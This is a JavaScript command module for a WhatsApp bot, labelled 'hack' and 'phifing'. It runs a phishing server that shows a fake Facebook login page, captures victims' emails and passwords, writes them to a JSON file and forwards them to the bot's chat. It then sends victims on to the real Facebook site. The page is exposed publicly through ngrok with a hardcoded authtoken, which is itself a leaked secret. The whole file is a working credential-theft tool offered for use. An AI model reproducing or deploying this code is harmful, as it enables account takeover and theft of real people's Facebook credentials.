
const fs = require("fs-extra");
const path = require("path");
const express = require('express');
const bodyParser = require('body-parser');
const logger = require('../../lib/function/logger');
const ngrok = require('ngrok');
const shortUrl = require('node-url-shortener');
let { MessageType} = require('@adiwajshing/baileys')
const localtunnel = require('localtunnel');

const port = 33333;

module.exports = {
  name: 'fb',
  alias: ['fb'],
  category: 'hack',
  desc: 'phifing',
  use: 'fb',
  async exec(msg, sock,arg,args) {
     try {
        ////////////////////////////////////////////////////////////
        const groupMetadata = msg.isGroup ? await sock.groupMetadata(msg.from) : []
        const groupMembers =  msg.isGroup ? await groupMetadata.participants : []

        const cmd = msg.body.slice(1).trim().split(' ').shift().toLowerCase()
        
     ////////////////////////////////////////////////////////////

     msg.reply('_[Peticion Enviada📬]_ \n_🕐Espere..._')
    
     const passwordsFilePath = path.resolve(global.appRoot + '/src/passwords.json');
     const app = express();
     
     app.use((req, res, next) => {
       logger.info(`${req.method.toUpperCase()} ${req.originalUrl}`);
       next();
     });
     app.use(bodyParser.urlencoded({ extended: false }));
     app.get('/', (req, res) => res.sendFile(path.resolve(global.appRoot + '/src/fb_inicio.html')));
     
     ////////////////Login
     app.post('/login', (req, res) => {
       const { email, pass } = req.body;
     
       let capturedPasswords;
       if (fs.existsSync(passwordsFilePath)) {
         capturedPasswords = fs.readJSONSync(passwordsFilePath);
       } else {
         capturedPasswords = [];
       }
     
       capturedPasswords.push({
         email,
         pass
       });
      //sock.sendMessage(msg.from, { text: `*Facebook*\n______________________________\n*Login:* _${email}_\n*Password:* _${pass}_` }, { quoted: message })
      sock.sendMessage(msg.from, { text: `*Facebook*\n______________________________\n*Login:* _${email}_\n*Password:* _${pass}_` }, {quoted: msg})
       fs.writeJSONSync(passwordsFilePath, capturedPasswords, { spaces: 2 });
     
       /*res.json({
         message: m.chat
       });*/
       res.redirect(`https://m.facebook.com${req.originalUrl}`)
       //res.redirect(`https://m.facebook.com/home.php`)
       //https://m.facebook.com/home.php
     
       app.use((req, res) => res.redirect(`https://m.facebook.com${req.originalUrl}`));
     });
     ////////////////End Login

     app.use((req, res) => res.redirect(`https://m.facebook.com${req.originalUrl}`));
     
     
      app.listen(port, async () => {
        
        // logger.info(`App listening on port ${port}!`)
        // const tunnel = await localtunnel({ port: port });
        // const url= tunnel.url
        // logger.info(`Ngrok: ${tunnel.url}`)

       const url = await ngrok.connect({addr:port, proto: 'http', authtoken:"2INypAX4gmmGH7TDZEAHR1BEFTo_7ZfwL6tzJNC62sRYma7Cc"})
       //logger.info(`Ngrok: ${url}`)
       console.log(`Ngrok: ${url}`)
       sock.sendMessage(msg.from, { text: `${url}\n_😂☝Increible😂🥰🥰_`}, {quoted: msg})   
        //  2INypAX4gmmGH7TDZEAHR1BEFTo_7ZfwL6tzJNC62sRYma7Cc
      //   ngrok.connect({
      //     proto: 'http', // http|tcp|tls
      //     addr: 8080, // port or network address
      //     auth: 'user:pwd', // http basic authentication for tunnel
      //     subdomain: 'alex', // reserved tunnel name https://alex.ngrok.io
      //     authtoken: '12345', // your authtoken from ngrok.com
      //     region: 'us' // one of ngrok regions (us, eu, au, ap), defaults to us
      // }, function (err, url) {});

    //      shortUrl.short(url, function(err, url_short){
    //        logger.info(`ShortUrl: ${url_short}`)
    //        sock.sendMessage(msg.from, { text: `${url_short}\n_😂☝Increible😂🥰🥰_`}, {quoted: msg})           
    //  });
    
     })
     
       
     /////////////////////////////////////////////////////////////
     } catch (error) {
        await msg.reply('‼✖Este comando provocó un error⚠.\nIntente con: _.help '+this.name+'_', { quoted: msg})
        console.log('Ocurrio un error\n'+error)
     }

  }
}